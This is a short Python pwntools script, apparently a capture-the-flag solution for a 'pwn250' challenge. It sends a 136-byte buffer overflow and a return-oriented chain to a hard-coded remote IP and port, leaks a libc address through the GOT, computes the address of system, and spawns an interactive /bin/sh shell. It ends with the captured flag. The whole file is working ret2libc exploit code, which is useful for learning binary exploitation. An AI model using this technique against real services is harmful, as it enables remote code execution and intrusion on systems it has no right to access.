from pwn import *

pop_3_ret=0x40056a
pop_1_ret=0x400633

elf=ELF('pwn250')
read_got=elf.symbols['got.read']
write_plt=elf.symbols['write']
here_addr=elf.symbols['here']

libc=ELF('libc.so')
read_offset=libc.symbols['read']
system_offset=libc.symbols['system']

pay="A"*136
pay+=p64(pop_3_ret)
pay+=p64(1)
pay+=p64(read_got)
pay+=p64(8)
pay+=p64(write_plt)
pay+=p64(here_addr)

r=remote('54.67.102.66','5255')
r.send(pay)
read_addr=int(r.recv(8)[::-1].encode('hex'),16)

libc_base=read_addr-read_offset
system_addr=libc_base+system_offset
binsh=libc_base+libc.search('/bin/sh').next()

pay="A"*136
pay+=p64(pop_1_ret)
pay+=p64(binsh)
pay+=p64(system_addr)

r.send(pay)
#r.send("cat /home/pwn250/flag")
r.interactive()

#Bugs_Bunny{Did_Ropgadget_help_pwner!_maybe_we_have_smart_guys_here!!}



